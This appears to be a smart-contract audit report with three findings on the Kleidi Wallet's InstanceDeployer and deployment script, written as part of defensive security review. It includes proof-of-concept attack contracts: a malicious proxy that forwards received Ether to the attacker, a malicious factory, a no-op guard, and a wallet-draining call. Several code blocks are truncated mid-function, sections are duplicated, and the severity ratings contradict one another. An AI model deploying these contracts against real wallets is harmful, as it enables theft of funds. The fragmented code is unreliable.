# Vulnerability One: Misuse of `assert` Statements Leading to Denial of Service (DoS)

https://github.com/code-423n4/2024-10-kleidi/blob/ab89bcb443249e1524496b694ddb19e298dca799/src/InstanceDeployer.sol#L139

**Severity Rating:** Low

## Summary

A critical vulnerability has been identified in the `InstanceDeployer.sol` contract of the Kleidi Wallet project. The misuse of `assert` statements within the `createSystemInstance` function can lead to unexpected contract halts and potential Denial of Service (DoS) scenarios. This vulnerability arises from improper ownership verification during the deployment of new wallet instances, which can be exploited to disrupt the normal operation of the wallet system.

## Vulnerability Details

### **1. Misuse of `assert` for Ownership Verification**

The `InstanceDeployer.sol` contract employs `assert` statements to verify the ownership configuration of newly deployed Safe instances. Here's the critical portion of the code:

```solidity
assert(Safe(payable(walletInstance.safe)).isOwner(address(this)));
```

**Explanation:**
- **Functionality:** This `assert` ensures that the `InstanceDeployer` contract itself is an owner of the newly deployed Safe.
- **Issue:** `assert` is intended for internal invariants that should **never** fail. Using it for external checks can lead to severe consequences if the condition is not met.

### **2. Potential for Denial of Service (DoS)**

An attacker can exploit this vulnerability by manipulating the deployment process to cause the `assert` statements to fail. This can be achieved by deploying a malicious `SafeProxyFactory` that initializes Safe contracts with incorrect ownership settings.

**Proof of Concept (PoC):**

#### **a. Malicious `SafeProxyFactory` Implementation**

```solidity
pragma solidity 0.8.25;

import "@safe/proxies/SafeProxyFactory.sol";
import "@safe/Safe.sol";
import "@safe/proxies/SafeProxy.sol";

contract MaliciousSafeProxyFactory is SafeProxyFactory {
    /**
     * @dev Override the `createProxyWithNonce` function to deploy a Safe with incorrect ownership.
     */
    function createProxyWithNonce(
        address masterCopy,
        bytes memory initializer,
        uint256 saltNonce
    ) public override returns (SafeProxy proxy) {
        // Malformed initialization data: No owners
        bytes memory malformedInitData = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            new address[](0), // No owners
            0,               // Threshold
            address(0),
            "",
            address(0),
            address(0),
            0,
            address(0)
        );

        // Deploy the SafeProxy with malformed initialization data
        proxy = super.createProxyWithNonce(masterCopy, malformedInitData, saltNonce);
    }
}
```

**Explanation:**
- **Purpose:** This malicious factory overrides the standard `createProxyWithNonce` function to deploy Safe contracts without any owners.
- **Impact:** When the `InstanceDeployer` uses this factory to deploy a new Safe, the `assert` statement checking for ownership will fail, consuming all remaining gas and reverting the transaction.

#### **b. Testing the Vulnerability Using Foundry**

        );
    }

    function testAssertFailureDueToNoOwners() public {
        // Prepare a NewInstance with one owner
        address[] memory owners = new address[](1);
        owners[0] = address(this);

        address[] memory recoverySpells = new address[](0);

        DeploymentParams memory timelockParams = DeploymentParams({
            minDelay: 1 days,
            expirationPeriod: 10 days,
            pauser: address(this),
            pauseDuration: 1 days,
            hotSigners: new address[](1)
        });

        NewInstance memory newInstance = NewInstance({
            owners: owners,
            threshold: 1,
            recoverySpells: recoverySpells,
            timelockParams: timelockParams
        });

        // Expect the transaction to revert due to assert failure
        vm.expectRevert("Panic(uint256)") // Solidity 0.8.25 panic code for assert failure is 0x01
            .call{gas: 1000000}(
                address(instanceDeployer),
                abi.encodeWithSignature("createSystemInstance((address[],uint256,address[],DeploymentParams))", newInstance)
            );
        
        // Attempt to create a new system instance
        instanceDeployer.createSystemInstance(newInstance);
    }
}
```

**Explanation:**
- **Malicious Factory Deployment:** The test deploys the `MaliciousSafeProxyFactory`, which is designed to initialize Safes without any owners.
- **InstanceDeployer Configuration:** The `InstanceDeployer` is configured to use this malicious factory.
- **Test Execution:** When `createSystemInstance` is called, the `assert` statements in `InstanceDeployer` fail due to the absence of owners, causing the transaction to revert and consume all gas.

**Expected Outcome:**
- The test should fail with a revert caused by the `assert` statements, demonstrating the potential for a DoS attack.

## Impact

- **Denial of Service (DoS):** Attackers can prevent the deployment of new wallet instances by causing the `assert` statements to fail, effectively halting the contract's functionality.
- **Gas Consumption:** Failed `assert` statements consume all remaining gas, making the deployment process costly and inefficient.
- **Operational Disruption:** Legitimate users may be unable to create new wallets, disrupting their ability to manage assets securely.

## Tools Used

- **Solidity 0.8.25:** The programming language used for smart contract development.
- **Foundry:** A smart contract development toolchain used for testing and deployment.
- **VS Code:** The code editor used for writing and managing the smart contracts and tests.
- **OpenZeppelin Contracts:** A library of secure smart contract components.
- **Safe Contracts:** Gnosis Safe contracts used for multisignature wallet functionalities.

## Recommendations

### **1. Replace `assert` with `require` Statements**

**Rationale:**
- `require` is intended for input validation and external checks, providing descriptive error messages and refunding remaining gas upon failure.
- Aligns with Solidity best practices by using `require` for conditions that can fail due to external factors.

**Implementation:**

```solidity
require(
    Safe(payable(walletInstance.safe)).isOwner(address(this)),
    "InstanceDeployer: Deployment failed, InstanceDeployer is not an owner"
);
require(
    Safe(payable(walletInstance.safe)).getOwners().length == 1,
    "InstanceDeployer: Deployment failed, Expected exactly one owner"
);
```

### **2. Implement Robust Pre-Deployment Checks**

- **Validate Initialization Parameters:**
  - Ensure all parameters used for Safe initialization are correctly set and sanitized before deployment.
  
- **Sanitize and Verify Input Data:**
  - Incorporate checks to prevent malformed or malicious initialization data from being used during Safe deployment.

### **3. Enhanced Error Handling and Logging**

- **Detailed Error Messages:**
  - Provide specific error messages with `require` statements to facilitate easier debugging and enhance transparency.
  
- **Event Emissions:**
  - Emit events during key stages of the deployment process to enable effective monitoring and auditing.

### **4. Conduct Comprehensive Testing and Auditing**

- **Regular Security Audits:**
  - Periodically audit the contract and its dependencies to identify and remediate emerging vulnerabilities.
  
- **Expand Test Coverage:**
  - Develop additional tests to cover various edge cases and potential attack vectors beyond the identified vulnerability.

### **5. Adhere to Solidity Best Practices**

- **Use Appropriate Error Handling Mechanisms:**
  - Reserve `assert` for internal invariants that should never fail.
  - Use `require` for conditions that depend on external inputs or can fail under normal operation.

- **Continuous Education:**
  - Ensure that all developers are familiar with Solidity best practices to prevent similar vulnerabilities in the future.

## Final Recommendations and Next Steps

1. **Immediate Refactoring:**
   - Replace all inappropriate `assert` statements in `InstanceDeployer.sol` with `require` statements, including descriptive error messages.

















# Vulnerability Two: Front-Running Vulnerability in InstanceDeployer.sol
**Severity Rating:** Low

https://github.com/code-423n4/2024-10-kleidi/blob/ab89bcb443249e1524496b694ddb19e298dca799/src/InstanceDeployer.sol#L186

## Summary

A critical front-running vulnerability has been identified in the `InstanceDeployer.sol` contract of the Kleidi Wallet project. This vulnerability allows an attacker to pre-deploy a malicious proxy at a predicted address using `CREATE2`, thereby intercepting the deployment process. As a result, the `InstanceDeployer` may interact with the attacker's proxy instead of the intended `SafeProxy`, leading to unauthorized control over the wallet and potential asset theft.

## Vulnerability Details

### **1. Vulnerable Code Segment in InstanceDeployer.sol**

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    bytes32 salt = keccak256(
        abi.encodePacked(keccak256(safeInitdata), creationSalt)
    );
    walletInstance.safe = SafeProxy(
        payable(
            calculateCreate2Address(
                safeProxyFactory,
                SafeProxyFactory(safeProxyFactory).proxyCreationCode(),
                abi.encode(safeProxyLogic),
                salt
            )
        )
    );

    emit SafeCreationFailed(
        msg.sender,
        block.timestamp,
        address(walletInstance.safe),
        safeInitdata,
        creationSalt
    );
}
```

**Explanation:**

- **Function Attempt:** The contract attempts to deploy a new `SafeProxy` using `createProxyWithNonce`.
- **Failure Handling:** If the deployment fails (e.g., due to the address already being occupied), the `catch` block calculates the expected address using `CREATE2` and assigns it to `walletInstance.safe` without verifying the proxy's integrity.
- **Assumption Flaw:** It assumes the proxy at the calculated address is the intended `SafeProxy`, which may not hold true if an attacker has pre-deployed a malicious contract at that address.

### **2. MaliciousSafeProxy Contract**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

contract MaliciousSafeProxy {
    address public owner;
    address public safeProxyLogic;

    constructor(address _logic) {
        owner = msg.sender;
        safeProxyLogic = _logic;
    }

    fallback() external payable {
        // Malicious fallback to intercept any calls
        if (msg.value > 0) {
            payable(owner).transfer(msg.value);
        }
    }

    receive() external payable {}
}
```

**Explanation:**

- **Purpose:** This contract mimics the `SafeProxy` interface but includes a malicious fallback function.
- **Malicious Behavior:** Any Ether sent to this proxy is immediately transferred to the attacker's address (`owner`), enabling unauthorized fund extraction.

        );
        maliciousProxy = new MaliciousSafeProxy{salt: bytes32(salt)}(address(safeProxyLogic));

        // Step 2: Attempt to create the system instance
        // This should trigger the catch block, assuming the proxy exists at the calculated address
        deployer.createSystemInstance(
            NewInstance({

                threshold: 1,

                    salt: bytes32(creationSalt)
                })
            })
        );

        // Step 3: Verify that the malicious proxy is set as the safe
        require(
            address(deployer.safe()) == address(maliciousProxy),
            "Attack failed: SafeProxy was not replaced with MaliciousSafeProxy"
        );
    }

    // Helper function to deposit Ether into the MaliciousSafeProxy
    function depositToMaliciousProxy() external payable {
        require(address(maliciousProxy) != address(0), "Malicious proxy not deployed");
        (bool success, ) = address(maliciousProxy).call{value: msg.value}("");

    }

    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**Explanation:**

- **Deployment:** Sets up the necessary contracts, including deploying the `InstanceDeployer` with references to `SafeProxyFactory`, `Safe`, `Guard`, `TimelockFactory`, and `Multicall3`.
- **simulateFrontRunningAttack Function:**
  - **Step 1:** Deploys a `MaliciousSafeProxy` at the predicted address using the same `creationSalt` as the legitimate deployment.
  - **Step 2:** Attempts to create the system instance, which fails to deploy the `SafeProxy` since the attacker’s proxy already exists, triggering the `catch` block.
  - **Step 3:** Verifies that the `InstanceDeployer` now points to the malicious proxy, confirming the vulnerability.

### **4. Exploitation Process**

#### **4.1. Deploying MaliciousSafeProxy**

The attacker pre-deploys a `MaliciousSafeProxy` at the predicted address using the same `creationSalt`:

```solidity
bytes32 salt = keccak256(
    abi.encodePacked(keccak256(safeInitdata), creationSalt)
);
maliciousProxy = new MaliciousSafeProxy{salt: bytes32(salt)}(address(safeProxyLogic));
```

**Explanation:**

- **Salt Calculation:** Mirrors the salt used in the legitimate deployment to ensure the proxy is deployed at the expected address.
- **Deployment:** Deploys the malicious proxy, which will intercept any transactions intended for the legitimate `SafeProxy`.

#### **4.2. Triggering the Vulnerability**

When `InstanceDeployer.createSystemInstance` is invoked:

```solidity
deployer.createSystemInstance(
    NewInstance({
        owners: new address[](1),
        threshold: 1,
        recoverySpells: new address[](0),
        timelockParams: DeploymentParams({
            minDelay: 1 days,
            expirationPeriod: 30 days,
            pauser: address(0),
            pauseDuration: 1 days,
            hotSigners: new address[](0),
            contractAddresses: new address[](0),
            selectors: new bytes4[](0),
            startIndexes: new uint16[](0),
            endIndexes: new uint16[](0),
            datas: new bytes[][](0),
            salt: bytes32(creationSalt)
        })
    })
);
```

**Explanation:**

- **Deployment Attempt:** Tries to deploy a new `SafeProxy` using `createProxyWithNonce`.
- **Failure Scenario:** Since the attacker has already deployed a proxy at the predicted address, the deployment fails, triggering the `catch` block.
- **Assumption:** The contract assumes the proxy exists at the calculated address without verifying its integrity.

#### **4.3. Exploiting the Compromised Proxy**

After successful exploitation:

```solidity
require(
    address(deployer.safe()) == address(maliciousProxy),
    "Attack failed: SafeProxy was not replaced with MaliciousSafeProxy"
);
```

**Explanation:**

- **Verification:** Confirms that the `InstanceDeployer` is now interacting with the malicious proxy.
- **Malicious Actions:** The attacker can now perform unauthorized actions, such as stealing funds through the proxy's fallback function.

## Impact

- **Asset Theft:** Attackers can intercept and redirect funds, leading to significant financial losses for users.
- **Unauthorized Control:** Malicious proxies can execute arbitrary transactions, altering wallet configurations or draining assets.
- **Trust Erosion:** Exploitation undermines user trust in the Kleidi Wallet's security mechanisms, potentially harming the project's reputation.
- **Irreversible Changes:** Unauthorized modifications to wallet settings can lead to permanent loss of control and assets.

## Tools Used

- **Foundry**


## Recommendations

To mitigate the identified front-running vulnerability in the `InstanceDeployer.sol` contract, implement the following measures:

### **1. Post-Deployment Verification**

After calculating the expected proxy address using `CREATE2`, verify that the proxy exists and matches the intended `SafeProxy` implementation.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    bytes32 salt = keccak256(
        abi.encodePacked(keccak256(safeInitdata), creationSalt)
    );
    address predictedAddress = calculateCreate2Address(
        safeProxyFactory,
        SafeProxyFactory(safeProxyFactory).proxyCreationCode(),
        abi.encode(safeProxyLogic),
        salt
    );

    // Verify that the proxy exists and matches the expected implementation
    require(
        Address.isContract(predictedAddress),
        "Guard: SafeProxy does not exist at the predicted address"
    );

    // Optional: Verify that the code at the predicted address matches SafeProxy
    bytes32 expectedCodeHash = keccak256(type(SafeProxy).creationCode);
    bytes32 actualCodeHash = keccak256(getCode(predictedAddress));
    require(
        actualCodeHash == expectedCodeHash,
        "Guard: Proxy code mismatch"
    );

    walletInstance.safe = SafeProxy(payable(predictedAddress));

    emit SafeCreationFailed(
        msg.sender,
        block.timestamp,
        address(walletInstance.safe),
        safeInitdata,
        creationSalt
    );
}

// Helper function to retrieve contract code
function getCode(address addr) internal view returns (bytes memory) {
    bytes memory code;
    assembly {
        // Retrieve the size of the code
        let size := extcodesize(addr)
        // Allocate output byte array
        code := mload(0x40)
        // Update free-memory pointer to allocate
        mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
        // Store length in memory
        mstore(code, size)
        // Retrieve code
        extcodecopy(addr, add(code, 0x20), 0, size)
    }
    return code;
}
```

**Explanation:**

- **Contract Verification:** Ensures that the contract at the predicted address exists and matches the expected `SafeProxy` implementation.
- **Code Hash Comparison:** Compares the hash of the deployed contract's bytecode with the expected hash to confirm integrity.
- **Rejection of Mismatches:** If verification fails, the transaction is reverted, preventing interaction with potentially malicious proxies.

### **2. Revert on Deployment Failure**

Instead of proceeding with assumptions when `createProxyWithNonce` fails, revert the entire transaction to prevent unauthorized interactions.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    revert("Guard: SafeProxy deployment failed");
}
```

**Explanation:**

- **Immediate Reversion:** Halts the deployment process if the proxy creation fails, eliminating the opportunity for attackers to exploit the catch block.
- **Security Assurance:** Ensures that only legitimate proxies are used, maintaining the wallet's integrity.

### **3. Implement Atomic Deployment**

Ensure that the deployment and configuration of the `SafeProxy` occur atomically within a single transaction, preventing any intermediate state where an attacker could intervene.

```solidity
function createSystemInstance(NewInstance memory instance)
    external
    returns (SystemInstance memory walletInstance)
{
    // Begin atomic deployment
    // Deploy SafeProxy and Timelock in a single transaction
    // Ensure all steps are completed without external interference
    // ...
}
```

**Explanation:**

- **Single Transaction Execution:** Consolidates all deployment steps into one atomic operation, reducing the window for potential front-running attacks.
- **Consistency:** Maintains the system's state integrity by ensuring that either all deployment steps succeed or none do.

### **4. Utilize Commit-Reveal Schemes**

Implement commit-reveal mechanisms for deployment parameters like `salt` to prevent attackers from predicting and pre-deploying malicious proxies.

```solidity
// Example Commit-Reveal Scheme
bytes32 public deploymentCommit;

function commitDeployment(bytes32 _commit) external onlyAuthorized {
    deploymentCommit = _commit;
}

function revealDeployment(/* parameters */) external onlyAuthorized {
    require(keccak256(abi.encodePacked(/* parameters */)) == deploymentCommit, "Invalid commit");
    // Proceed with deployment
}
```

**Explanation:**

- **Commit Phase:** Securely commit to deployment parameters without revealing them, preventing attackers from predicting future deployments.
- **Reveal Phase:** Later reveal the committed parameters, ensuring that deployment occurs with verified and non-predictable salts.

### **5. Restrict Deployment Access**

Limit who can initiate the deployment process, ensuring that only trusted entities can deploy new instances.

```solidity
modifier onlyAuthorized() {
    require(msg.sender == authorizedAddress, "Caller is not authorized");
    _;
}

function createSystemInstance(NewInstance memory instance)
    external
    onlyAuthorized
    returns (SystemInstance memory walletInstance)
{
    // Deployment logic
}
```

**Explanation:**

- **Access Control:** Ensures that only designated addresses can perform sensitive deployment operations.
- **Security Enforcement:** Reduces the risk of unauthorized or malicious deployments by restricting access.

### **6. Enhanced Error Handling and Logging**

Implement comprehensive error handling and logging to monitor and respond to deployment anomalies effectively.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch Error(string memory reason) {
    emit DeploymentFailed(msg.sender, reason);
    revert("Guard: SafeProxy deployment failed");
} catch {
    emit DeploymentFailed(msg.sender, "Unknown error");
    revert("Guard: SafeProxy deployment failed");
}
```

**Explanation:**

- **Detailed Reverts:** Provides specific error messages based on the failure reason, aiding in debugging and monitoring.
- **Event Emissions:** Logs deployment failures for external monitoring and alerting systems.

## Impact

- **Asset Theft:** Attackers can intercept and redirect funds, leading to significant financial losses for users.
- **Unauthorized Control:** Malicious proxies can execute arbitrary transactions, altering wallet configurations or draining assets.
- **Trust Erosion:** Exploitation undermines user trust in the Kleidi Wallet's security mechanisms, potentially harming the project's reputation.
- **Irreversible Changes:** Unauthorized modifications to wallet settings can lead to permanent loss of control and assets.

## Tools Used

- **Solidity:** Programming language for writing smart contracts.
- **Foundry:** A development toolchain for Ethereum smart contracts used for testing and deployment.
- **VS Code:** Code editor for writing and managing smart contract code.
- **OpenZeppelin Contracts:** Utilized for standard contract implementations and security.
- **CREATE2 Opcode:** Used for deploying contracts at deterministic addresses, which is central to the identified vulnerability.

## Recommendations

To mitigate the identified front-running vulnerability in the `InstanceDeployer.sol` contract, implement the following changes:

### **1. Post-Deployment Verification**

After calculating the expected proxy address using `CREATE2`, verify that the proxy exists and matches the intended `SafeProxy` implementation.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    bytes32 salt = keccak256(
        abi.encodePacked(keccak256(safeInitdata), creationSalt)
    );
    address predictedAddress = calculateCreate2Address(
        safeProxyFactory,
        SafeProxyFactory(safeProxyFactory).proxyCreationCode(),
        abi.encode(safeProxyLogic),
        salt
    );

    // Verify that the proxy exists and matches the expected implementation
    require(
        Address.isContract(predictedAddress),
        "Guard: SafeProxy does not exist at the predicted address"
    );

    // Optional: Verify that the code at the predicted address matches SafeProxy
    bytes32 expectedCodeHash = keccak256(type(SafeProxy).creationCode);
    bytes32 actualCodeHash = keccak256(getCode(predictedAddress));
    require(
        actualCodeHash == expectedCodeHash,
        "Guard: Proxy code mismatch"
    );

    walletInstance.safe = SafeProxy(payable(predictedAddress));

    emit SafeCreationFailed(
        msg.sender,
        block.timestamp,
        address(walletInstance.safe),
        safeInitdata,
        creationSalt
    );
}

// Helper function to retrieve contract code
function getCode(address addr) internal view returns (bytes memory) {
    bytes memory code;
    assembly {
        // Retrieve the size of the code
        let size := extcodesize(addr)
        // Allocate output byte array
        code := mload(0x40)
        // Update free-memory pointer to allocate
        mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
        // Store length in memory
        mstore(code, size)
        // Retrieve code
        extcodecopy(addr, add(code, 0x20), 0, size)
    }
    return code;
}
```

**Explanation:**

- **Contract Verification:** Ensures that the contract at the predicted address exists and matches the expected `SafeProxy` implementation.
- **Code Hash Comparison:** Compares the hash of the deployed contract's bytecode with the expected hash to confirm integrity.
- **Rejection of Mismatches:** If verification fails, the transaction is reverted, preventing interaction with potentially malicious proxies.

### **2. Revert Instead of Proceeding on Failure**

Instead of proceeding with assumptions when `createProxyWithNonce` fails, revert the entire transaction to prevent unauthorized interactions.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    revert("Guard: SafeProxy deployment failed");
}
```

    external
    returns (SystemInstance memory walletInstance)
{
    // Begin atomic deployment
    // Deploy SafeProxy and Timelock in a single transaction
    // Ensure all steps are completed without external interference
    // ...
}
```

    // Proceed with deployment
}
```

    external
    onlyAuthorized
    returns (SystemInstance memory walletInstance)
{
    // Deployment logic
}
```

Implementing these recommendations will significantly enhance the security of the `InstanceDeployer.sol` contract, mitigating the identified front-running vulnerability and safeguarding user assets.

























# Vulnerability three: Missing Parameter Validation During Deployment

https://github.com/code-423n4/2024-10-kleidi/blob/ab89bcb443249e1524496b694ddb19e298dca799/src/deploy/SystemDeploy.s.sol#L54-L61

**Severity Rating:** low

## Summary

A critical vulnerability exists in the **Kleidi Wallet** system's deployment process within the `SystemDeploy.s.sol` contract. The `InstanceDeployer` contract is deployed without adequate validation of its dependency addresses (`SAFE_FACTORY`, `SAFE_LOGIC`, `TIMELOCK_FACTORY`, `GUARD`, and `MULTICALL3`). This omission allows an attacker to inject malicious contracts as dependencies, compromising the entire wallet system's security and integrity.

## Vulnerability Details

### **1. Vulnerable Deployment of InstanceDeployer**

The `SystemDeploy` contract deploys the `InstanceDeployer` without verifying the integrity of essential dependency addresses. This lack of validation permits the substitution of legitimate contracts with malicious ones.

```solidity
InstanceDeployer deployer = new InstanceDeployer{salt: salt}(
    addresses.getAddress("SAFE_FACTORY"),
    addresses.getAddress("SAFE_LOGIC"),
    addresses.getAddress("TIMELOCK_FACTORY"),
    addresses.getAddress("GUARD"),
    addresses.getAddress("MULTICALL3")
);
```

**Explanation:**

The above code initializes the `InstanceDeployer` with addresses fetched from the `Addresses` contract. However, it does not confirm whether these addresses point to the correct and trusted contracts. If an attacker manipulates these addresses to point to malicious contracts, the deployed `InstanceDeployer` will inherit and propagate these compromises.

---

### **2. Injecting Malicious Contracts as Dependencies**

By deploying malicious versions of `SAFE_FACTORY` and `GUARD`, an attacker can control the behavior of wallets created via the compromised `InstanceDeployer`.

```solidity
// MaliciousSafeFactory.sol
pragma solidity 0.8.25;

contract MaliciousSafeFactory {
    function createProxyWithNonce(
        address _safeProxyLogic,
        bytes memory _safeInitdata,
        uint256 _creationSalt
    ) external returns (address) {
        // Deploy a proxy pointing to a malicious implementation
        address maliciousLogic = /* Address of MaliciousSafeLogic */;
        bytes memory bytecode = abi.encodePacked(
            hex"363d3d373d3d3d363d73",
            bytes20(maliciousLogic),
            hex"5af43d82803e903d91602b57fd5bf3"
        );
        address proxy;
        assembly {
            proxy := create2(0, add(bytecode, 0x20), mload(bytecode), _creationSalt)
            if iszero(extcodesize(proxy)) { revert(0, 0) }
        }
        return proxy;
    }
}
```

**Explanation:**

The `MaliciousSafeFactory` overrides the `createProxyWithNonce` function to deploy proxies that point to a malicious implementation instead of the legitimate `SAFE_LOGIC`. This allows the attacker to inject harmful logic into newly created wallets.

---

### **3. Bypassing Security Checks with a Malicious Guard**

A malicious `Guard` can override transaction verification, allowing unauthorized operations such as fund withdrawals or permission escalations.

```solidity
// MaliciousGuard.sol
pragma solidity 0.8.25;

import {BaseGuard} from "@safe/base/GuardManager.sol";
import {Enum} from "@safe/common/Enum.sol";

contract MaliciousGuard is BaseGuard {
    function checkTransaction(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operationType,
        uint256,
        uint256,
        uint256,
        address,
        address payable,
        bytes memory,
        address
    ) external view override {
        // Bypass all checks to allow any transaction
    }

    function checkAfterExecution(bytes32, bool) external pure override {}
}
```

**Explanation:**

The `MaliciousGuard` effectively nullifies all transaction checks by providing empty implementations of `checkTransaction` and `checkAfterExecution`. This allows any transaction, including malicious ones, to pass through without restrictions.

---

### **4. Exploiting the Compromised InstanceDeployer**

With the `InstanceDeployer` initialized using malicious dependencies, any wallet it creates will inherit these vulnerabilities, enabling an attacker to perform unauthorized actions.

```solidity
// Example of exploiting the compromised wallet
bytes memory maliciousData = abi.encodeWithSignature(
    "execTransaction(address,uint256,bytes,Enum.Operation)",
    attackerAddress,
    drainAmount,
    "",
    Enum.Operation.DelegateCall
);

(bool success, ) = address(wallet).call{value: 0}(maliciousData);
require(success, "Attack failed");
```

**Explanation:**

The attacker crafts a malicious transaction that leverages the compromised `Guard` to execute unauthorized operations, such as draining funds from the wallet to the attacker's address.

## Impact

The absence of parameter validation during the deployment of the `InstanceDeployer` allows attackers to:

- **Compromise Wallets:** Inject malicious logic into wallets, enabling unauthorized fund transfers and control over wallet operations.
- **Undermine Security Mechanisms:** Bypass critical security checks, facilitating permission escalations and disabling protective features like timelocks.
- **System-Wide Exploits:** Affect all wallets deployed via the compromised `InstanceDeployer`, leading to widespread financial losses and erosion of user trust.

Given the pivotal role of the `InstanceDeployer` in initializing and configuring wallets, this vulnerability is classified as **High Severity**.

## Tools Used

- **Solidity:** Programming language used for smart contracts.
- **Foundry:** Development tool for compiling, testing, and deploying Solidity contracts.
- **Hardhat/Ganache:** Local Ethereum development environments for testing.
- **VS Code:** Integrated development environment for writing and managing code.

## Recommendations

To mitigate this vulnerability and enhance the security of the **Kleidi Wallet** system, the following measures should be implemented:

### **1. Implement Strict Address Validation**

Before deploying the `InstanceDeployer`, ensure that all dependency addresses (`SAFE_FACTORY`, `SAFE_LOGIC`, `TIMELOCK_FACTORY`, `GUARD`, and `MULTICALL3`) are verified to point to the correct and trusted contracts.

```solidity
// Example of address validation
require(
    addresses.getAddress("SAFE_FACTORY") == expectedSafeFactoryAddress,
    "Invalid SAFE_FACTORY address"
);
require(
    addresses.getAddress("GUARD") == expectedGuardAddress,
    "Invalid GUARD address"
);
// Repeat for other dependencies
```

**Explanation:**

By enforcing that each dependency address matches a predefined trusted address, the system prevents the injection of malicious contracts during deployment.

---

### **2. Enhance Access Controls**

Restrict who can set or modify addresses within the `Addresses` contract. Implement role-based access controls to ensure only authorized entities can update critical configurations.

```solidity
// Example using OpenZeppelin's AccessControl
import "@openzeppelin/contracts/access/AccessControl.sol";

contract Addresses is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");

    constructor() {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }

    function addAddress(string memory key, address addr, bool isSet) external onlyRole(ADMIN_ROLE) {
        addressMap[key] = addr;
        isSetMap[key] = isSet;
    }

    // Rest of the contract...
}
```

**Explanation:**

By leveraging access control mechanisms, the system ensures that only trusted administrators can modify critical addresses, reducing the risk of unauthorized changes.

---

### **3. Incorporate Contract Verification**

Use on-chain verification methods to confirm the integrity of deployed contracts. This can include checking contract bytecode or using interface checks to ensure contracts behave as expected.

```solidity
// Example of bytecode verification
function verifyContract(address contractAddress, bytes memory expectedBytecode) internal view returns (bool) {
    bytes memory contractCode = address(contractAddress).code;
    return keccak256(contractCode) == keccak256(expectedBytecode);
}
```

**Explanation:**

By comparing the deployed contract's bytecode against a known good hash, the system can detect and prevent the use of malicious contracts.

---
